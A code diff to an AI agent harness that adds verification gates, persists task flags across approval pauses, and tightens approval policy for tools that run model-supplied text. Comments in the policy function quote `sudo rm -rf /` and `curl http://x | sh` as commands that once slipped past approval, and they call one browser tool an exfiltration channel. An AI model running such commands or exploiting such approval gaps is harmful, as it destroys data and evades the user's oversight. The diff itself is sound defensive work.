@@ -24,6 +24,23 @@ from .policy import Policy
 from .render import _clip_strings, _failure_detail, _summarize_args, tool_detail
 from .workspace import Workspace
 
+# Caveats worth spending context on every single task, because each one is a
+# way the agent can act confidently and be wrong. The full set lives in
+# kwin.CAPABILITY_NOTES and is available on demand via
+# kwin.capability_report() — this is the subset that changes what the model
+# should do rather than what it should know. Chosen for actionability:
+# prefer window-relative coordinates, re-list after acting, keep batches small,
+# don't wait on pixels, and don't trust a yes as an outcome.
+_PREAMBLE_CAVEATS = (
+    "screenshots",
+    "window_relative_coords",
+    "window_control",
+    "visual_annotations",
+    "wait_for_screen_change",
+    "batch_actions",
+    "multi_display",
+)
+
 # ── execution context ────────────────────────────────────────────────────
 
 
@@ -52,29 +69,59 @@ class Context:
         self.mcp_clients = {}
 
 
-def verify(ctx, path):
-    """Enforced post-write verification: syntax, then lint when available."""
+def verify(ctx, path, kinds=("syntax", "lint")):
+    """Enforced post-write verification: the checks the tool declared, in the
+    order it declared them.
+
+    `kinds` is the tool's own `verify=` declaration (resolved to a concrete
+    list in tools.py's `tool()`), not a hardcoded pair: the field used to be
+    declared on three tools and read by nobody while this function ran
+    "syntax then lint" for anything flagged `mutates`, so a tool could not
+    opt out of the lint pass and a tool outside the `mutates` set got no
+    verification at all regardless. The loop now has no opinion here beyond
+    running what it is told.
+
+    A target that no longer exists is reported as skipped rather than failed —
+    delete_file and a checkpoint_restore that removed a created file both land
+    here legitimately, and calling that a syntax failure would report a
+    successful operation as broken.
+    """
     out = {}
+    if not str(path).strip():
+        return {"skipped": True, "reason": "the call named no file to check"}
+    if not kinds:
+        return {"skipped": True, "reason": "the tool declared no checks to run"}
     try:
-        syn = toolreg.REGISTRY["syntax_check"]["handler"](ctx, {"path": path})
-        out["syntax"] = {
-            "ok": syn.get("ok"),
-            "error": (syn.get("stderr") or syn.get("error") or "")[:600],
-        }
+        ctx.workspace.resolve(path, must_exist=True)
+    except FileNotFoundError:
+        return {"skipped": True, "reason": "the file no longer exists"}
     except Exception as e:
-        out["syntax"] = {"ok": False, "error": str(e)}
-    try:
-        spec = ctx.workspace.tooling(ctx.workspace.resolve(path))["commands"].get(
-            "lint"
-        )
-        if spec:
-            lin = toolreg.REGISTRY["lint"]["handler"](ctx, {"path": path})
-            out["lint"] = {
-                "ok": lin.get("ok"),
-                "output": (lin.get("stdout") or lin.get("error") or "")[:800],
-            }
-    except Exception as e:
-        out["lint"] = {"ok": False, "error": str(e)}
+        return {"skipped": True, "reason": f"target could not be resolved: {e}"}
+    for kind in kinds:
+        if kind == "syntax":
+            try:
+                syn = toolreg.REGISTRY["syntax_check"]["handler"](
+                    ctx, {"path": path}
+                )
+                out["syntax"] = {
+                    "ok": syn.get("ok"),
+                    "error": (syn.get("stderr") or syn.get("error") or "")[:600],
+                }
+            except Exception as e:
+                out["syntax"] = {"ok": False, "error": str(e)}
+        elif kind == "lint":
+            try:
+                spec = ctx.workspace.tooling(ctx.workspace.resolve(path))[
+                    "commands"
+                ].get("lint")
+                if spec:
+                    lin = toolreg.REGISTRY["lint"]["handler"](ctx, {"path": path})
+                    out["lint"] = {
+                        "ok": lin.get("ok"),
+                        "output": (lin.get("stdout") or lin.get("error") or "")[:800],
+                    }
+            except Exception as e:
+                out["lint"] = {"ok": False, "error": str(e)}
     return out
 
 
@@ -158,7 +205,7 @@ def _build_ws_info(ws, progress):
     missing = [k for k, v in tooling.items() if not v]
     # Tell the model what the desktop can actually do, so it reports a missing
     # capability instead of burning steps retrying something that cannot work.
-    caps = kwin.capabilities()
+    caps = kwin.capabilities_cached()
     desktop = (
         f"screen capture={'yes' if caps['screenshots'] else 'NO'}, "
         f"window inventory={'yes' if caps['window_inventory'] else 'NO'}, "
@@ -170,6 +217,23 @@ def _build_ws_info(ws, progress):
         desktop += f" — keyboard unavailable: {caps['keyboard_detail']}"
     if not caps["pointer"]:
         desktop += f" — pointer unavailable: {caps['pointer_detail']}"
+    # "If a capability is NO, say so plainly" is only half the instruction: a
+    # capability reported as available can still be the wrong tool for the job,
+    # and the model has no way to know which. These are the host facts that
+    # took live debugging to establish — screen scale is one scalar from the
+    # first output, spectacle's monitor mode means the current monitor, the
+    # element-id cache is not invalidated, window control other than activate
+    # is unverified. They used to live only in the comments of the functions
+    # that discovered them, i.e. available to the author and to nobody else.
+    # Each is a way the agent can be confidently wrong, so they go in the
+    # preamble rather than in a report the model has to know to ask for.
+    report = kwin.capability_report(caps)
+    caveats = [
+        f"{name}: {entry['caveat']}"
+        for name, entry in report.items()
+        if entry.get("available") and entry.get("caveat")
+        and name in _PREAMBLE_CAVEATS
+    ]
     # Unlike node's npm test / cargo's cargo test, Python's test runner
     # can't be inferred from a project marker file — pytest vs. plain
     # unittest.discover depends only on what's actually importable, and
@@ -203,6 +267,13 @@ def _build_ws_info(ws, progress):
         + py_test_line
         + f"Desktop capabilities: {desktop}\n"
         + "If a capability is NO, say so plainly instead of retrying it.\n"
+        + (
+            "Desktop caveats (these capabilities work, but not the way you "
+            "might assume):\n"
+            + "".join(f"  - {c}\n" for c in caveats)
+            if caveats
+            else ""
+        )
         + "Sandbox: "
         + (
             "bwrap + cgroup limits"
@@ -218,13 +289,103 @@ def _build_ws_info(ws, progress):
     return ws_info
 
 
+# Flags that describe the TASK, not one run() call.
+#
+# They used to live only in run()'s local `st` bag, which silently reset every
+# time approve() resumed a task: the writes happened in the first run, and the
+# resumed run started with mutated_testable/ran_tests false, so every stop-time
+# check forgot what the task had already done. Confirmed live on the
+# strict-01 fixture — the agent wrote wordfreq.py, its test suite, README and
+# CHANGELOG, then hit an approval on its `run_command`; the resumed turn
+# reported completion and none of the three gates (todos, tests, review) could
+# see that any of it had happened. Only `todos` survived, because it is
+# persisted in session_state; these were not.
+#
+# Persisted in session_state alongside task_steps/current_task/todos, which is
+# what already makes a continuation inherit the task. A brand-new task resets
+# them, so a stale flag can never leak forward from unrelated work.
+_TASK_FLAGS = (
+    "mutated_any",
+    "mutated_testable",
+    "ran_tests",
+    "ran_gate",
+    "nudged_todos",
+    "nudged_verify",
+    "nudged_gate",
+)
+
+
+def _flag_bag():
+    """A fresh set of task flags plus the per-run flail trackers."""
+    st = {k: False for k in _TASK_FLAGS}
+    st["last_sig"] = None
+    st["consecutive"] = 0
+    st["last_results"] = {}
+    # Primed to the initial values, not empty: an empty shadow would make every
+    # key look "changed" on the first _save_task_flags() and turn the
+    # change-only optimisation into a full 7-row write on step one.
+    st["_saved"] = {k: False for k in _TASK_FLAGS}
+    return st
+
+
+def _load_task_flags(db, session, st):
+    """Restore task flags for a continuation; reset them for a new task.
+
+    `_saved` is primed to the loaded values so the first _save_task_flags()
+    only writes what actually changes.
+    """
+    for k in _TASK_FLAGS:
+        val = get_state(db, session, k) == "1"
+        st[k] = val
+        st["_saved"][k] = val
+
+
+def _save_task_flags(db, session, st):
+    """Persist any task flag that changed since the last call.
+
+    Called once per step, so it has to be cheap: it writes only the keys that
+    actually flipped rather than all seven (set_state commits per call, and
+    most steps change nothing).
+    """
+    for k in _TASK_FLAGS:
+        want = bool(st[k])
+        if st["_saved"].get(k) == want:
+            continue
+        set_state(db, session, k, "1" if want else "0")
+        st["_saved"][k] = want
+
+
 def _finish_nudges(db, session, choice, todos, st, step_idx, max_steps):
-    """One-shot stop-time nudges: unfinished todos, then missing verification.
+    """One-shot stop-time nudges: unfinished todos, then missing tests, then a
+    missing mechanical review of the deliverable.
 
     Returns ``(user_message, progress_summary)`` to inject (caller journals
     the user event, emits progress, and continues the step loop), or None to
     let the turn finish normally. `st` is run()'s mutable flag bag:
-    {"nudged_todos", "nudged_verify", "mutated_testable", "ran_tests"}.
+    {"nudged_todos", "nudged_verify", "nudged_gate", "mutated_testable",
+    "ran_tests", "ran_gate"}.
+
+    The third nudge is the one that exists because a real run finished a
+    complete-looking deliverable without ever calling verify_deliverable,
+    having skipped it while the system prompt asked for it twice. The
+    instruction was in the prompt; the prompt is not a mechanism. Enforcing it
+    here is the same move as enforcing verify() after every write instead of
+    asking for it in prose.
+
+    It fires on `mutated_any` — the task changed at least one file — rather
+    than on `mutated_testable`, which additionally requires the runtime to
+    have detected a test command. That distinction was found the hard way: in
+    a project with no test-runner marker, mutated_testable stays false for the
+    whole task, so a model could write an entire deliverable and get neither
+    this nudge nor the run_tests one. A review gate that only exists for
+    projects that happen to have pytest configured is not a gate.
+
+    A declining model is still allowed to finish: the nudge is one-shot and the
+    gate is not a hard block, because a hard block that the model cannot
+    satisfy (no tests present, the tools genuinely missing) would strand a task
+    at the step ceiling with no report at all. It records the ask in the action
+    feed, so a run that skipped it is visible after the fact rather than
+    silent.
     """
     pending = [t for t in todos if t.get("status") != "completed"]
     if pending and not st["nudged_todos"] and step_idx < max_steps - 1:
@@ -255,6 +416,29 @@ def _finish_nudges(db, session, choice, todos, st, step_idx, max_steps):
             "finish.",
             "no test run yet — continuing instead of stopping",
         )
+    if (
+        st["mutated_any"]
+        and not st["ran_gate"]
+        and not st["nudged_gate"]
+        and step_idx < max_steps - 1
+    ):
+        st["nudged_gate"] = True
+        event(db, session, "assistant", {"text": choice.get("content") or ""})
+        return (
+            "Before your report: call verify_deliverable on the work and fix "
+            "every finding it returns. It mechanically checks what a reviewer "
+            "would otherwise have to catch by hand — strict lint, types, "
+            "complexity, docstring coverage, dead code, security lint, secrets, "
+            "test-weakening, stray artifacts. Two classes of defect it exists "
+            "to catch have been observed shipping straight past a "
+            "self-assessment: a feature claimed in the report that no test "
+            "exercises, and a real-world caveat of a well-known pattern that "
+            "went unmentioned. A finding you knowingly ship must be defended "
+            "in the report, not left out of it. If the check is genuinely "
+            "unavailable here, say so in the report and finish.",
+            "no mechanical review of the deliverable — continuing instead of "
+            "reporting",
+        )
     return None
 
 
@@ -265,8 +449,18 @@ def _policy_subjects(spec, ctx, args):
     (`subject=` in lib/tools.py) rather than assumed to be `path`, because
     assuming it meant move_file (src/dst) and checkpoint_restore (id) were
     classified with no subject at all.
+
+    Returns `[None]` for a tool that judges no path at all — `subject` is None
+    when the tool's schema has no path-shaped argument, so the list is
+    non-empty but carries nothing to match patterns against. The `or [None]`
+    at the call site exists for the other case: a tool that *does* declare a
+    path subject but was called without one (an optional `path` the model
+    omitted, which the handler then defaults), where the verdict is genuinely
+    about the call rather than about a path.
     """
     declared = spec.get("subject")
+    if not declared:
+        return [None]
     if callable(declared):
         return [s for s in (declared(ctx, args) or []) if s]
     names = declared if isinstance(declared, (list, tuple)) else ("path",)
@@ -319,8 +513,20 @@ def policy_decision(policy, spec, ctx, args):
     # the specific "exec outside the auto-approved scope"/"exec requires
     # approval" prompts this mismatch produces, never a real deny from a
     # hard-deny rule or saved policy memory.
+    #
+    # The last clause used to be an assumption. The message says "sandboxed"
+    # and nothing verified it: `sandboxed` was declared on a handful of tools
+    # and read by nobody, syntax_check/format_file/lint confined their
+    # subprocesses through sandbox.run while declaring False, and verify_ui —
+    # which starts a `--no-sandbox` Chromium with working network and then
+    # navigates it to a model-authored file:// page, i.e. a working
+    # exfiltration channel — satisfied every other condition and was
+    # auto-approved on the strength of a claim that was false for it
+    # specifically. Gating on the declared flag makes the claim checked, and
+    # verify_ui is now the one tool in this set that prompts.
     if (
         spec["grant"] == "exec"
+        and spec.get("sandboxed")
         and "command" not in spec["parameters"].get("properties", {})
         and decision == "prompt"
         and reason.startswith("exec ")
@@ -329,7 +535,30 @@ def policy_decision(policy, spec, ctx, args):
             "auto",
             f"auto: {spec['name']} is a fixed, sandboxed, workspace-scoped action",
         )
+    # A tool given free-text process input is never auto-approved, whatever
+    # its grant. The grant answers "may this agent use the mouse" and says
+    # nothing about "may this agent run this string": focus_or_launch
+    # (grant="input") takes an argument documented as "Optional custom command
+    # to launch if app is not running" and shlex.splits it into an unsandboxed
+    # Popen, so `sudo rm -rf /` was auto-approved through it while
+    # run_command refused the same string. Applying HARD_DENY to any command
+    # regardless of grant (policy.classify) closes the named cases; this
+    # closes the rest, because `curl http://x | sh` matches no hard-deny rule
+    # and would otherwise still sail through on the input grant. Keyed on the
+    # argument being present, so the same tool's .desktop-table path — the
+    # ordinary "open dolphin" case — is unaffected. Applies after the
+    # downgrade above so it cannot be laundered through, and never touches a
+    # deny.
+    spawn_arg = spec.get("spawn_arg")
+    if spawn_arg and args.get(spawn_arg) and decision == "auto":
+        decision, reason = (
+            "prompt",
+            f"{spec['name']} would execute model-supplied text in "
+            f"{spawn_arg!r} ({spec['grant']} grant) — execution always "
+            f"surfaces for approval",
+        )
     return decision, reason
+
 
 
 # A model that repeats the exact same call *back to back* is flailing, not
@@ -568,26 +797,66 @@ def _dispatch_calls(
         if name == "todo_write" and result.get("ok") and stream:
             emit({"type": "todos", "todos": ctx.todos})
 
-        if spec["mutates"] and result.get("ok") and args.get("path"):
-            v = verify(ctx, args["path"])
-            result["verify"] = v
-            ok = v.get("syntax", {}).get("ok")
-            progress(
-                "verify",
-                f"{name} → syntax {'ok' if ok else 'FAILED'}"
-                + (" · lint ok" if v.get("lint", {}).get("ok") else ""),
-                "ok" if ok else "blocked",
-                id=cid,
-            )
-            if not st["mutated_testable"]:
-                try:
-                    p = ctx.workspace.resolve(args["path"])
-                    if ctx.workspace.tooling(p)["commands"].get("test"):
-                        st["mutated_testable"] = True
-                except Exception:
-                    pass
+        if spec["mutates"] and result.get("ok"):
+            st["mutated_any"] = True
+            # The file this call actually changed, which is not always the one
+            # the arguments name: checkpoint_restore takes an id and reports
+            # the restored path in its result, and the old `args.get("path")`
+            # test meant it silently got no verification despite declaring
+            # mutates=True. Falling back to the result is what lets a tool
+            # declare a check on something it resolves itself.
+            target = args.get("path") or result.get("path")
+            if spec["undo"] and not result.get("checkpoint"):
+                # The tool claims the mutation is undoable and then returned no
+                # checkpoint id, so nothing on disk can be put back. Undoing
+                # by hand is the only recovery, which is the opposite of what
+                # the declaration promises — say so where it will be seen
+                # rather than letting the claim stand.
+                errlog.warning(
+                    "undo_not_checkpointed",
+                    tool=name,
+                    session=session,
+                    step=step_idx,
+                    path=target,
+                )
+                result["undo"] = {
+                    "ok": False,
+                    "error": "declared undoable but no checkpoint was taken — "
+                    "this change cannot be reverted",
+                }
+            if target and spec["verify"]:
+                v = verify(ctx, target, spec["verify"])
+                result["verify"] = v
+                if v.get("skipped"):
+                    progress("verify", f"{name} → {v['reason']}", "ok", id=cid)
+                else:
+                    ok = v.get("syntax", {}).get("ok")
+                    progress(
+                        "verify",
+                        f"{name} → syntax {'ok' if ok else 'FAILED'}"
+                        + (" · lint ok" if v.get("lint", {}).get("ok") else ""),
+                        "ok" if ok else "blocked",
+                        id=cid,
+                    )
+                # Only a tool with a real syntax target counts as "edited
+                # something testable" — otherwise delete_file's verify=() would
+                # arm the run_tests nudge for a deletion.
+                if not st["mutated_testable"] and not v.get("skipped"):
+                    try:
+                        p = ctx.workspace.resolve(target)
+                        if ctx.workspace.tooling(p)["commands"].get("test"):
+                            st["mutated_testable"] = True
+                    except Exception:
+                        pass
         if name == "run_tests":
             st["ran_tests"] = True
+        if name == "verify_deliverable":
+            # Set on the call, not on its verdict: a failing gate still means
+            # the model ran the check, and the finish nudge's job is to make
+            # sure the check happened at all. A gate that reports findings the
+            # model then declines to fix is a different problem, and logging
+            # every failing finding is verify_deliverable's own job.
+            st["ran_gate"] = True
 
         st["last_results"][sig] = result
         event(db, session, "tool", {"id": cid, "name": name, "result": result})
@@ -697,15 +966,14 @@ def run(task, session, workspace_root, stream=False, is_continuation=False):
     # todo_write items and starts chatting is drifting off task just as much
     # as one that wanders into unrelated work mid-stream. Same one-shot idea
     # for verification (see _finish_nudges); flags live in the shared bag.
-    st = {
-        "nudged_todos": False,
-        "nudged_verify": False,
-        "mutated_testable": False,
-        "ran_tests": False,
-        "last_sig": None,
-        "consecutive": 0,
-        "last_results": {},
-    }
+    st = _flag_bag()
+    if is_continuation:
+        # Same task still in flight: inherit what it already did, so the
+        # stop-time gates remember the work done before the approval pause.
+        _load_task_flags(db, session, st)
+    else:
+        for k in _TASK_FLAGS:
+            set_state(db, session, k, "0")
 
     # A mid-stream connection drop after real content already arrived (see
     # _DURABLE_STREAM_EVENT_TYPES) used to kill the whole task outright —
@@ -743,6 +1011,7 @@ def run(task, session, workspace_root, stream=False, is_continuation=False):
 
     for step_idx in range(steps_used, MAX_STEPS):
         set_state(db, session, "task_steps", step_idx + 1)
+        _save_task_flags(db, session, st)
         task_elapsed = time.time() - task_started
         if task_elapsed > MAX_TASK_SECONDS:
             _log_budget_incident(
